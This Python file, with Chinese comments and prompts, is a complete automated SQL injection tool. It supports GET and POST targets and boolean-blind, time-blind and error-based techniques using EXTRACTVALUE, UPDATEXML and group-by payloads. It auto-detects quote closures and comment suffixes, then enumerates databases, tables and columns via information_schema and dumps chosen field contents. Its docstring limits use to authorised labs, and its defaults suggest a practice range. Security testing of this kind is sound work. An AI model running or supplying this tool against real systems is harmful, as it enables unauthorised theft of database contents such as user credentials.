#!/usr/bin/env python3
"""
SQL 注入自动化辅助脚本。

支持：
1. GET / POST 注入点。
2. 自动探测或手动指定布尔盲注、时间盲注、报错注入。
3. 自动探测常见闭合方式、AND/OR、注释符。
4. 爆数据库、爆表、爆字段、爆指定字段内容。

仅用于你拥有授权的靶场或测试环境。
"""

from __future__ import annotations

import argparse
import html
import re
import sys
import time
from dataclasses import dataclass
from difflib import SequenceMatcher
from typing import Optional
from urllib.parse import parse_qsl, quote, urlencode

import requests


INJECTION_MARKER = "{inj}"
CSV_SEPARATOR = ","
VALUE_SEPARATOR = " | "
VALUE_SEPARATOR_HEX = "0x207c20"  # " | "
NULL_MARKER_HEX = "0x3c4e554c4c3e"  # "<NULL>"
ERROR_TEST_TEXT = "codexcheck"
ERROR_TEST_SQL = "SELECT 0x636f646578636865636b"

DEFAULT_PREFIX_CANDIDATES = [
    "1",
    "1'",
    '1"',
    "1)",
    "1')",
    '1")',
    "1))",
    "1'))",
    '1"))',
]
DEFAULT_OPERATOR_CANDIDATES = ["AND", "OR"]
DEFAULT_SUFFIX_CANDIDATES = ["-- -", "#", "/*", ""]
DEFAULT_ERROR_METHODS = ["extractvalue", "updatexml", "group_by"]


@dataclass
class Calibration:
    true_body: str = ""
    false_body: str = ""
    true_len: int = 0
    false_len: int = 0
    marker: Optional[str] = None
    false_elapsed: float = 0.0
    true_elapsed: float = 0.0


class SQLiDumper:
    def __init__(
        self,
        base_url: str,
        injection_marker: str,
        technique: str,
        operator: Optional[str],
        prefix: Optional[str],
        suffix: Optional[str],
        marker: str,
        timeout: float,
        delay: float,
        proxy: Optional[str],
        verbose: bool,
        sleep_time: float,
        time_threshold: float,
        request_method: str,
        post_data: Optional[str],
        post_param: Optional[str],
        content_type: str,
        raw_payload: bool,
        error_method: str,
        error_chunk_len: int,
    ) -> None:
        self.base_url = base_url
        self.injection_marker = injection_marker
        self.technique = technique
        self.request_method = request_method.upper()
        self.post_data = post_data
        self.post_param = post_param
        self.content_type = content_type
        self.raw_payload = raw_payload
        self.operator_candidates = [operator.upper()] if operator else DEFAULT_OPERATOR_CANDIDATES
        self.operator = self.operator_candidates[0]
        self.prefix_candidates = [prefix] if prefix is not None else DEFAULT_PREFIX_CANDIDATES
        self.prefix = self.prefix_candidates[0]
        self.suffix_candidates = [suffix] if suffix is not None else DEFAULT_SUFFIX_CANDIDATES
        self.suffix = self.suffix_candidates[0]
        self.error_methods = DEFAULT_ERROR_METHODS if error_method == "auto" else [error_method]
        self.error_method = self.error_methods[0]
        self.error_chunk_len = error_chunk_len
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.sleep_time = sleep_time
        self.time_threshold = time_threshold
        self.preferred_marker = marker
        self.request_count = 0
        self.calibration: Optional[Calibration] = None

        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "sql-injection-lab-helper/2.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
        )
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def _condition_expr(self, condition: str) -> str:
        if self.technique == "time":
            return f"IF(({condition}),SLEEP({self.sleep_time}),0)"
        return f"({condition})"

    def _build_condition_payload(
        self,
        prefix: str,
        operator: str,
        suffix: str,
        condition: str,
    ) -> str:
        payload = f"{prefix} {operator} {self._condition_expr(condition)}"
        if suffix:
            payload += suffix
        return payload

    def _payload_for(self, condition: str) -> str:
        return self._build_condition_payload(
            self.prefix,
            self.operator,
            self.suffix,
            condition,
        )

    def _error_expression(self, method: str, sql: str, offset: int, chunk_len: int) -> str:
        chunk = f"SUBSTR(({sql}),{offset},{chunk_len})"
        marker = f"CONCAT(0x7e,{chunk},0x7e)"

        if method == "extractvalue":
            return f"EXTRACTVALUE(1,{marker})"
        if method == "updatexml":
            return f"UPDATEXML(1,{marker},1)"
        if method == "group_by":
            grouped = (
                "SELECT COUNT(*),"
                f"CONCAT(0x7e,{chunk},0x7e,FLOOR(RAND(0)*2)) AS x "
                "FROM information_schema.tables GROUP BY x"
            )
            return f"(SELECT 1 FROM ({grouped}) AS e)"

        raise ValueError(f"unknown error method: {method}")

    def _build_error_payload(
        self,
        prefix: str,
        operator: str,
        suffix: str,
        method: str,
        sql: str,
        offset: int,
        chunk_len: int,
    ) -> str:
        payload = f"{prefix} {operator} {self._error_expression(method, sql, offset, chunk_len)}"
        if suffix:
            payload += suffix
        return payload

    def _payload_value(self, payload: str) -> str:
        if self.raw_payload:
            return payload
        return quote(payload, safe="")

    def _url_for(self, payload: str) -> str:
        encoded_payload = self._payload_value(payload)
        if self.injection_marker and self.injection_marker in self.base_url:
            return self.base_url.replace(self.injection_marker, encoded_payload)
        return self.base_url + encoded_payload

    def _post_body_for(self, payload: str) -> str:
        if not self.post_data:
            raise RuntimeError("POST 模式需要 POST 请求体。")

        if self.injection_marker in self.post_data:
            return self.post_data.replace(self.injection_marker, self._payload_value(payload))

        if not self.post_param:
            raise RuntimeError(
                f"POST 请求体必须包含 {self.injection_marker}，或用 --post-param 指定注入参数。"
            )

        pairs = parse_qsl(self.post_data, keep_blank_values=True)
        replaced = False
        for index, (name, _value) in enumerate(pairs):
            if name == self.post_param:
                pairs[index] = (name, payload)
                replaced = True

        if not replaced:
            raise RuntimeError(f"POST 请求体中找不到参数 {self.post_param!r}。")

        return urlencode(pairs)

    def _request(self, payload: str) -> tuple[str, float]:
        url = self._url_for(payload) if self.request_method == "GET" else self.base_url
        if self.verbose:
            print(f"[REQ] {self.request_method} {url}", file=sys.stderr)

        last_error: Optional[Exception] = None
        for attempt in range(3):
            try:
                start = time.perf_counter()
                if self.request_method == "POST":
                    body = self._post_body_for(payload)
                    if self.verbose:
                        print(f"[BODY] {body}", file=sys.stderr)
                    response = self.session.post(
                        url,
                        data=body,
                        headers={"Content-Type": self.content_type},
                        timeout=self.timeout,
                        proxies=self.proxies,
                        allow_redirects=True,
                    )
                else:
                    response = self.session.get(
                        url,
                        timeout=self.timeout,
                        proxies=self.proxies,
                        allow_redirects=True,
                    )
                elapsed = time.perf_counter() - start
                self.request_count += 1
                if self.delay:
                    time.sleep(self.delay)
                return response.text, elapsed
            except requests.RequestException as exc:
                last_error = exc
                time.sleep(0.5 + attempt)

        raise RuntimeError(f"request failed after retries: {last_error}")

    def _get(self, payload: str) -> str:
        body, _elapsed = self._request(payload)
        return body

    def calibrate(self) -> None:
        if self.calibration is not None:
            return

        if self.technique == "auto":
            errors = []
            for technique in ["error", "boolean", "time"]:
                self.technique = technique
                try:
                    self.calibrate()
                    return
                except RuntimeError as exc:
                    errors.append(f"{technique}: {exc}")
                    self.calibration = None
            self.technique = "auto"
            raise RuntimeError("自动探测失败。\n" + "\n".join(errors))

        if self.technique == "error":
            self._calibrate_error()
        elif self.technique == "time":
            self._calibrate_time()
        else:
            self._calibrate_boolean()

    def _calibrate_boolean(self) -> None:
        tested = []
        for prefix in self.prefix_candidates:
            for operator in self.operator_candidates:
                for suffix in self.suffix_candidates:
                    tested.append(f"prefix={prefix!r}, operator={operator!r}, suffix={suffix!r}")
                    true_body = self._get(
                        self._build_condition_payload(prefix, operator, suffix, "1=1")
                    )
                    false_body = self._get(
                        self._build_condition_payload(prefix, operator, suffix, "1=2")
                    )

                    if true_body == false_body:
                        continue

                    marker = None
                    if self.preferred_marker:
                        true_has = self.preferred_marker in true_body
                        false_has = self.preferred_marker in false_body
                        if true_has and not false_has:
                            marker = self.preferred_marker

                    self.prefix = prefix
                    self.operator = operator
                    self.suffix = suffix
                    self.calibration = Calibration(
                        true_body=true_body,
                        false_body=false_body,
                        true_len=len(true_body),
                        false_len=len(false_body),
                        marker=marker,
                    )
                    mode = f"marker={marker!r}" if marker else "response similarity"
                    print(
                        f"[*] 布尔盲注校准成功: prefix={prefix!r}, operator={operator!r}, "
                        f"suffix={suffix!r}, oracle={mode}"
                    )
                    return

        raise RuntimeError("所有闭合模板的 true/false 响应都相同。已测试: " + "; ".join(tested))

    def _calibrate_time(self) -> None:
        tested = []
        for prefix in self.prefix_candidates:
            for operator in self.operator_candidates:
                for suffix in self.suffix_candidates:
                    tested.append(f"prefix={prefix!r}, operator={operator!r}, suffix={suffix!r}")
                    _false_body, false_elapsed = self._request(
                        self._build_condition_payload(prefix, operator, suffix, "1=2")
                    )
                    _true_body, true_elapsed = self._request(
                        self._build_condition_payload(prefix, operator, suffix, "1=1")
                    )

                    if true_elapsed - false_elapsed < self.time_threshold:
                        continue

                    self.prefix = prefix
                    self.operator = operator
                    self.suffix = suffix
                    self.calibration = Calibration(
                        false_elapsed=false_elapsed,
                        true_elapsed=true_elapsed,
                    )
                    print(
                        f"[*] 时间盲注校准成功: prefix={prefix!r}, operator={operator!r}, "
                        f"suffix={suffix!r}, false={false_elapsed:.2f}s, true={true_elapsed:.2f}s"
                    )
                    return

        raise RuntimeError("所有闭合模板都没有产生稳定延迟。已测试: " + "; ".join(tested))

    def _calibrate_error(self) -> None:
        tested = []
        for method in self.error_methods:
            for prefix in self.prefix_candidates:
                for operator in self.operator_candidates:
                    for suffix in self.suffix_candidates:
                        tested.append(
                            f"method={method!r}, prefix={prefix!r}, "
                            f"operator={operator!r}, suffix={suffix!r}"
                        )
                        payload = self._build_error_payload(
                            prefix,
                            operator,
                            suffix,
                            method,
                            ERROR_TEST_SQL,
                            1,
                            self.error_chunk_len,
                        )
                        body = self._get(payload)
                        value = self._extract_error_value(body)
                        if value != ERROR_TEST_TEXT:
                            continue

                        self.error_method = method
                        self.prefix = prefix
                        self.operator = operator
                        self.suffix = suffix
                        self.calibration = Calibration(true_body=body, true_len=len(body))
                        print(
                            f"[*] 报错注入校准成功: method={method!r}, prefix={prefix!r}, "
                            f"operator={operator!r}, suffix={suffix!r}"
                        )
                        return

        raise RuntimeError("所有报错注入模板都未回显测试字符串。已测试: " + "; ".join(tested))

    @staticmethod
    def _extract_error_value(body: str) -> Optional[str]:
        text = html.unescape(body)
        matches = re.findall(r"~([^~]*)~", text, flags=re.S)
        if not matches:
            return None
        return matches[-1]

    def _dump_string_error(self, sql: str, max_len: int) -> str:
        if self.calibration is None:
            self.calibrate()

        result = []
        offset = 1
        while len("".join(result)) < max_len:
            payload = self._build_error_payload(
                self.prefix,
                self.operator,
                self.suffix,
                self.error_method,
                sql,
                offset,
                self.error_chunk_len,
            )
            body = self._get(payload)
            chunk = self._extract_error_value(body)
            if chunk is None:
                raise RuntimeError("报错注入未能从响应中提取 ~...~ 回显。")
            if not chunk:
                break

            result.append(chunk)
            current = "".join(result)
            print(f"\r[+] {current}", end="", flush=True)

            if len(chunk) < self.error_chunk_len:
                break
            offset += len(chunk)

        print()
        return "".join(result)[:max_len]

    def is_true(self, condition: str) -> bool:
        if self.calibration is None:
            self.calibrate()

        assert self.calibration is not None
        payload = self._payload_for(condition)

        if self.technique == "time":
            _body, elapsed = self._request(payload)
            return elapsed >= self.calibration.false_elapsed + self.time_threshold

        body = self._get(payload)
        if self.calibration.marker:
            return self.calibration.marker in body

        true_score = SequenceMatcher(None, body, self.calibration.true_body).ratio()
        false_score = SequenceMatcher(None, body, self.calibration.false_body).ratio()
        return true_score > false_score

    def find_length(self, sql: str, max_len: int) -> int:
        low, high = 0, max_len
        while low < high:
            mid = (low + high + 1) // 2
            condition = f"CHAR_LENGTH(({sql})) >= {mid}"
            if self.is_true(condition):
                low = mid
            else:
                high = mid - 1
            print(f"\r[*] 长度二分: {low}..{high}", end="", flush=True)

        print()
        return low

    def find_char(self, sql: str, pos: int, char_min: int, char_max: int) -> str:
        low, high = char_min, char_max
        while low < high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTR(({sql}),{pos},1)) > {mid}"
            if self.is_true(condition):
                low = mid + 1
            else:
                high = mid
        return chr(low)

    def dump_string(self, sql: str, max_len: int, char_min: int, char_max: int) -> str:
        if self.calibration is None:
            self.calibrate()

        if self.technique == "error":
            return self._dump_string_error(sql, max_len)

        length = self.find_length(sql, max_len)
        print(f"[*] 结果长度: {length}")

        result = []
        for pos in range(1, length + 1):
            ch = self.find_char(sql, pos, char_min, char_max)
            result.append(ch)
            print(f"\r[+] {''.join(result)}", end="", flush=True)

        print()
        return "".join(result)


def sql_hex(value: str) -> str:
    return "0x" + value.encode("utf-8").hex()


def quote_identifier(value: str) -> str:
    return "`" + value.replace("`", "``") + "`"


def qualified_table(database: str, table: str) -> str:
    return f"{quote_identifier(database)}.{quote_identifier(table)}"


def database_names_sql() -> str:
    return (
        "SELECT GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR ',') "
        "FROM information_schema.schemata"
    )


def table_names_sql(database: str) -> str:
    return (
        "SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') "
        "FROM information_schema.tables "
        f"WHERE table_schema={sql_hex(database)}"
    )


def all_database_table_names_sql() -> str:
    return (
        "SELECT GROUP_CONCAT(CONCAT(table_schema,'.',table_name) "
        "ORDER BY table_schema,table_name SEPARATOR ',') "
        "FROM information_schema.tables"
    )


def column_names_sql(database: str, table: str) -> str:
    return (
        "SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
        "FROM information_schema.columns "
        f"WHERE table_schema={sql_hex(database)} AND table_name={sql_hex(table)}"
    )


def field_values_sql(database: str, table: str, column: str, row_limit: int) -> str:
    source = qualified_table(database, table)
    selected_column = quote_identifier(column)
    limit_clause = f" LIMIT {row_limit}" if row_limit > 0 else ""
    return (
        "SELECT GROUP_CONCAT(COALESCE(CAST(x AS CHAR),"
        f"{NULL_MARKER_HEX}) SEPARATOR {VALUE_SEPARATOR_HEX}) "
        f"FROM (SELECT {selected_column} AS x FROM {source}{limit_clause}) AS dump_rows"
    )


def split_csv(value: str) -> list[str]:
    return [item for item in value.split(CSV_SEPARATOR) if item]


def print_numbered(title: str, items: list[str]) -> None:
    print(f"\n[{title}]")
    if not items:
        print("(empty)")
        return
    for index, item in enumerate(items, start=1):
        print(f"{index}. {item}")


def strip_wrapping_quotes(value: str) -> str:
    value = value.strip()
    wrappers = [("“", "”"), ("”", "“"), ('"', '"'), ("'", "'")]
    changed = True
    while changed and len(value) >= 2:
        changed = False
        for left, right in wrappers:
            if value.startswith(left) and value.endswith(right):
                value = value[1:-1].strip()
                changed = True
                break
    return value


def choose_menu(prompt: str, options: list[str]) -> int:
    print(f"\n{prompt}")
    for index, option in enumerate(options, start=1):
        print(f"{index}. {option}")
    while True:
        answer = input("请输入编号: ").strip()
        if answer.isdigit():
            index = int(answer)
            if 1 <= index <= len(options):
                return index
        print("[!] 输入无效，请重新输入。")


def choose_item(title: str, items: list[str]) -> Optional[str]:
    if not items:
        print(f"\n[{title}]")
        print("(empty)")
        return None

    print_numbered(title, items)
    while True:
        answer = input("请输入编号，或输入 q 退出: ").strip()
        if not answer or answer.lower() in {"q", "quit", "exit"}:
            return None
        if answer.isdigit():
            index = int(answer)
            if 1 <= index <= len(items):
                selected = items[index - 1]
                print(f"[*] 已选择: {selected}")
                return selected
        print("[!] 编号无效，请重新输入。")


def dump_csv(
    sqli: SQLiDumper,
    sql: str,
    max_len: int,
    char_min: int,
    char_max: int,
) -> list[str]:
    raw = sqli.dump_string(sql, max_len=max_len, char_min=char_min, char_max=char_max)
    return split_csv(raw)


def dump_raw(
    sqli: SQLiDumper,
    sql: str,
    max_len: int,
    char_min: int,
    char_max: int,
) -> str:
    return sqli.dump_string(sql, max_len=max_len, char_min=char_min, char_max=char_max)


def ensure_tables(
    sqli: SQLiDumper,
    table_cache: dict[str, list[str]],
    database: str,
    args: argparse.Namespace,
) -> list[str]:
    if database not in table_cache:
        table_cache[database] = dump_csv(
            sqli,
            table_names_sql(database),
            max_len=args.max_len,
            char_min=args.char_min,
            char_max=args.char_max,
        )
    return table_cache[database]


def ensure_columns(
    sqli: SQLiDumper,
    column_cache: dict[tuple[str, str], list[str]],
    database: str,
    table: str,
    args: argparse.Namespace,
) -> list[str]:
    key = (database, table)
    if key not in column_cache:
        column_cache[key] = dump_csv(
            sqli,
            column_names_sql(database, table),
            max_len=args.max_len,
            char_min=args.char_min,
            char_max=args.char_max,
        )
    return column_cache[key]


def parse_all_table_pairs(raw_items: list[str]) -> dict[str, list[str]]:
    result: dict[str, list[str]] = {}
    for item in raw_items:
        if "." not in item:
            continue
        database, table = item.split(".", 1)
        result.setdefault(database, []).append(table)
    return result


def print_table_cache(table_cache: dict[str, list[str]]) -> None:
    print("\n[TABLES]")
    if not table_cache:
        print("(empty)")
        return
    for database in sorted(table_cache):
        print(f"\n{database}:")
        tables = table_cache[database]
        if not tables:
            print("  (empty)")
            continue
        for table in tables:
            print(f"  - {table}")


def print_columns_for_table(
    sqli: SQLiDumper,
    column_cache: dict[tuple[str, str], list[str]],
    database: str,
    table: str,
    args: argparse.Namespace,
) -> None:
    columns = ensure_columns(sqli, column_cache, database, table, args)
    print(f"\n{database}.{table}:")
    if not columns:
        print("  (empty)")
        return
    for column in columns:
        print(f"  - {column}")


def run_table_stage(
    sqli: SQLiDumper,
    databases: list[str],
    table_cache: dict[str, list[str]],
    args: argparse.Namespace,
) -> None:
    mode = choose_menu(
        "请选择爆表模式",
        [
            "退出",
            "爆出所有数据库的所有表",
            "爆出指定数据库的所有表",
        ],
    )
    if mode == 1:
        raise SystemExit(0)

    if mode == 2:
        raw_items = dump_csv(
            sqli,
            all_database_table_names_sql(),
            max_len=args.max_len,
            char_min=args.char_min,
            char_max=args.char_max,
        )
        table_cache.update(parse_all_table_pairs(raw_items))
        print_table_cache(table_cache)
        return

    database = choose_item("请选择数据库", databases)
    if not database:
        raise SystemExit(0)
    tables = ensure_tables(sqli, table_cache, database, args)
    print_numbered(f"TABLES {database}", tables)


def choose_database_and_table(
    sqli: SQLiDumper,
    databases: list[str],
    table_cache: dict[str, list[str]],
    args: argparse.Namespace,
) -> tuple[Optional[str], Optional[str]]:
    database = choose_item("请选择数据库", databases)
    if not database:
        return None, None
    tables = ensure_tables(sqli, table_cache, database, args)
    table = choose_item(f"请选择表: {database}", tables)
    if not table:
        return None, None
    return database, table


def run_column_stage(
    sqli: SQLiDumper,
    databases: list[str],
    table_cache: dict[str, list[str]],
    column_cache: dict[tuple[str, str], list[str]],
    args: argparse.Namespace,
) -> None:
    mode = choose_menu(
        "请选择爆字段模式",
        [
            "退出",
            "爆出所有已列出表的所有字段名",
            "爆出指定表的所有字段名",
        ],
    )
    if mode == 1:
        raise SystemExit(0)

    if mode == 2:
        if not table_cache:
            print("[!] 还没有表名缓存，请先选择爆表模式。")
            run_table_stage(sqli, databases, table_cache, args)
        print("\n[COLUMNS]")
        for database in sorted(table_cache):
            for table in table_cache[database]:
                print_columns_for_table(sqli, column_cache, database, table, args)
        return

    database, table = choose_database_and_table(sqli, databases, table_cache, args)
    if not database or not table:
        raise SystemExit(0)
    print_columns_for_table(sqli, column_cache, database, table, args)


def run_field_dump_stage(
    sqli: SQLiDumper,
    databases: list[str],
    table_cache: dict[str, list[str]],
    column_cache: dict[tuple[str, str], list[str]],
    args: argparse.Namespace,
) -> None:
    database, table = choose_database_and_table(sqli, databases, table_cache, args)
    if not database or not table:
        raise SystemExit(0)

    columns = ensure_columns(sqli, column_cache, database, table, args)
    column = choose_item(f"请选择字段: {database}.{table}", columns)
    if not column:
        raise SystemExit(0)

    print(f"\n[DATA {database}.{table}.{column}]")
    raw = dump_raw(
        sqli,
        field_values_sql(database, table, column, args.row_limit),
        max_len=args.max_len,
        char_min=args.char_min,
        char_max=args.char_max,
    )
    if raw:
        for index, value in enumerate(raw.split(VALUE_SEPARATOR), start=1):
            print(f"{index}. {value}")
    else:
        print("(empty)")


def choose_technique(args: argparse.Namespace) -> str:
    if args.technique:
        return args.technique
    mode = choose_menu(
        "请选择注入方式",
        [
            "自动探测",
            "布尔盲注",
            "时间盲注",
            "报错注入",
        ],
    )
    return ["auto", "boolean", "time", "error"][mode - 1]


def choose_request_method(args: argparse.Namespace) -> str:
    if args.method:
        return args.method.upper()
    mode = choose_menu("请选择请求方式", ["GET 型注入", "POST 型注入"])
    return "GET" if mode == 1 else "POST"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="SQL 注入自动化辅助脚本。")
    parser.add_argument(
        "-u",
        "--url",
        default=None,
        help="目标 URL。GET 可把注入点放 URL 末尾，或用 {inj} 精确指定。",
    )
    parser.add_argument("--ask-url", action="store_true", help="启动后手动输入目标 URL。")
    parser.add_argument(
        "--method",
        choices=["GET", "POST", "get", "post"],
        default=None,
        help="请求方式。不传则启动后选择。",
    )
    parser.add_argument(
        "--data",
        default=None,
        help="POST 请求体。推荐包含 {inj}，也可配合 --post-param 指定参数。",
    )
    parser.add_argument("--post-param", default=None, help="POST 表单中要注入的参数名。")
    parser.add_argument(
        "--content-type",
        default="application/x-www-form-urlencoded",
        help="POST 请求 Content-Type。",
    )
    parser.add_argument(
        "--raw-payload",
        action="store_true",
        help="不对 payload URL 编码，直接替换 {inj}。JSON body 常用。",
    )
    parser.add_argument(
        "--technique",
        choices=["auto", "boolean", "time", "error"],
        default=None,
        help="注入方式。不传则启动后选择。",
    )
    parser.add_argument(
        "--error-method",
        choices=["auto", "extractvalue", "updatexml", "group_by"],
        default="auto",
        help="报错注入函数。不传则自动尝试。",
    )
    parser.add_argument(
        "--error-chunk-len",
        type=int,
        default=24,
        help="报错注入每次回显分片长度。",
    )
    parser.add_argument(
        "--injection-marker",
        default=INJECTION_MARKER,
        help="URL/POST body 中标记注入点的占位符。",
    )
    parser.add_argument("--prefix", default=None, help="闭合前缀。不传则自动探测。")
    parser.add_argument(
        "--operator",
        choices=["AND", "OR", "and", "or"],
        default=None,
        help="条件连接符。不传则自动探测 AND/OR。",
    )
    parser.add_argument("--suffix", default=None, help="SQL 注释后缀。不传则自动探测。")
    parser.add_argument(
        "--marker",
        default="You are in",
        help="布尔盲注 true 响应特征文本。传空字符串关闭 marker 模式。",
    )
    parser.add_argument("--max-len", type=int, default=2048, help="最大输出长度。")
    parser.add_argument("--row-limit", type=int, default=50, help="爆字段内容时限制行数。")
    parser.add_argument("--char-min", type=int, default=32, help="最小 ASCII 编码。")
    parser.add_argument("--char-max", type=int, default=126, help="最大 ASCII 编码。")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP 超时时间，秒。")
    parser.add_argument("--delay", type=float, default=0.05, help="每次请求后的延迟，秒。")
    parser.add_argument("--sleep-time", type=float, default=3.0, help="时间盲注 SLEEP 秒数。")
    parser.add_argument(
        "--time-threshold",
        type=float,
        default=1.5,
        help="时间盲注判定 true 的延迟阈值，秒。",
    )
    parser.add_argument("--proxy", help="代理地址，例如 http://127.0.0.1:8080。")
    parser.add_argument("-v", "--verbose", action="store_true", help="打印请求。")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    args.technique = choose_technique(args)
    args.method = choose_request_method(args)
    marker = args.marker if args.marker else ""

    if args.ask_url or not args.url:
        custom_url = input(
            "请输入目标 URL（GET 可用 {inj} 指定注入点，POST 填接口地址）: "
        ).strip()
        args.url = strip_wrapping_quotes(custom_url)
    elif args.url:
        args.url = strip_wrapping_quotes(args.url)

    if not args.url:
        print("未输入目标 URL，脚本停止。", file=sys.stderr)
        return 2

    if args.method == "POST" and not args.data:
        args.data = input(
            "请输入 POST 请求体，例如 passwd=2&submit=Submit&uname={inj}: "
        ).strip()
    if args.method == "POST" and args.data:
        args.data = strip_wrapping_quotes(args.data)
    if args.method == "POST" and args.data and args.injection_marker not in args.data and not args.post_param:
        args.post_param = input(
            "POST 请求体中没有 {inj}，请输入要注入的参数名，例如 uname: "
        ).strip()
    if args.method == "POST" and (
        not args.data or (args.injection_marker not in args.data and not args.post_param)
    ):
        print(f"POST 请求体必须包含 {args.injection_marker}，或指定 --post-param。", file=sys.stderr)
        return 2

    if args.char_min < 0 or args.char_max > 255 or args.char_min > args.char_max:
        print("ASCII 范围无效。", file=sys.stderr)
        return 2
    if args.row_limit < 0:
        print("row-limit 必须 >= 0。", file=sys.stderr)
        return 2
    if args.sleep_time <= 0 or args.time_threshold <= 0:
        print("sleep-time 和 time-threshold 必须 > 0。", file=sys.stderr)
        return 2
    if args.error_chunk_len <= 0:
        print("error-chunk-len 必须 > 0。", file=sys.stderr)
        return 2
    if args.technique in {"auto", "time"} and args.timeout <= args.sleep_time + 1:
        args.timeout = args.sleep_time + 5
        print(f"[*] 自动调整 timeout 为 {args.timeout:.1f}s")

    sqli = SQLiDumper(
        base_url=args.url,
        injection_marker=args.injection_marker,
        technique=args.technique,
        operator=args.operator,
        prefix=args.prefix,
        suffix=args.suffix,
        marker=marker,
        timeout=args.timeout,
        delay=args.delay,
        proxy=args.proxy,
        verbose=args.verbose,
        sleep_time=args.sleep_time,
        time_threshold=args.time_threshold,
        request_method=args.method,
        post_data=args.data,
        post_param=args.post_param,
        content_type=args.content_type,
        raw_payload=args.raw_payload,
        error_method=args.error_method,
        error_chunk_len=args.error_chunk_len,
    )

    try:
        databases = dump_csv(
            sqli,
            database_names_sql(),
            max_len=args.max_len,
            char_min=args.char_min,
            char_max=args.char_max,
        )
        print_numbered("DATABASES", databases)

        table_cache: dict[str, list[str]] = {}
        column_cache: dict[tuple[str, str], list[str]] = {}

        run_table_stage(sqli, databases, table_cache, args)
        run_column_stage(sqli, databases, table_cache, column_cache, args)

        mode = choose_menu("请选择是否爆字段内容", ["退出", "爆出指定表的指定字段内容"])
        if mode == 2:
            run_field_dump_stage(sqli, databases, table_cache, column_cache, args)

    except SystemExit as exc:
        code = int(exc.code) if isinstance(exc.code, int) else 0
        print(f"\n[*] HTTP requests: {sqli.request_count}")
        return code
    except KeyboardInterrupt:
        print("\n[!] Interrupted", file=sys.stderr)
        return 130
    except Exception as exc:
        print(f"\n[!] {exc}", file=sys.stderr)
        return 1

    print(f"\n[*] HTTP requests: {sqli.request_count}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
